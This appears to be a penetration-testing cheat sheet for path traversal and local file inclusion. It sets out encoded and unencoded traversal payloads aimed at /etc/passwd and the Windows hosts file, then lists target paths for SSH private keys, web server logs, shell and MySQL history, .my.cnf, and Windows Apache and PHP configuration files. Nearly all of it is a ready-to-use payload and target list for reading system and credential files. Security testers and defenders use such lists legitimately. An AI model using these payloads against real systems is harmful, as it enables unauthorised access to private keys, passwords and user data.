1. View users on machine
2. Search for SSH Keys
3. Search for passwords in log or configuration files (.htaccess, config.php)

```http
/../../../../../../../../../etc/passwd
../../../../../../../../../etc/passwd
../../../../../../../../../windows/system32/drivers/etc/hosts
..\..\..\..\..\..\..\..\..\windows\system32\drivers\etc\hosts

/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd
%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd
/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/windows/system32/drivers/etc/hosts
\%2e%2e\%2e%2e\%2e%2e\%2e%2e\%2e%2e\%2e%2e\%2e%2e\%2e%2e\windows\system32\drivers\etc\hosts
```

##### SSH Keys
```bash
id_rsa
id_ecdsa
id_ecdsa_sk
id_ed25519
id_ed25519_sk
id_dsa

authorized_keys
id_rsa.keystore
id_rsa.pub
known_hosts
```

##### HTTPD, Apach2, Nginx logs
```bash
/var/log/apache/access.log 
/var/log/apache2/access.log 
/var/log/apache/access_log 
/var/log/apache2/access_log
/var/log/access_log
/var/log/nginx/access.log 
/var/log/nginx/access_log 
/etc/httpd/logs/acces_log 
/etc/httpd/logs/error_log 
/var/www/logs/access_log 
/var/www/logs/access.log 
/usr/local/apache/logs/access. log 
/opt/apache2/logs/access_log
/opt/apache2/logs/access.log
/opt/apache/logs/access_log
/opt/apache/logs/access.log
```

##### IIS
```bash
C:\inetpub\logs\LogFiles\W3SVC1\
C:\inetpub\wwwroot\web.config
```

##### Linux user specific
```bash
.bash_history
.mysql_history
.my.cnf
```

##### Windows
```powershell
c:\apache\php\php.ini 
c:\xampp\apache\bin\php.ini  
c:\xampp\apache\logs\access.log
c:\Program Files\Apache Group\Apache\conf\httpd.conf  
c:\Program Files\Apache Group\Apache2\conf\httpd.conf  
c:\Program Files\xampp\apache\conf\httpd.conf  
```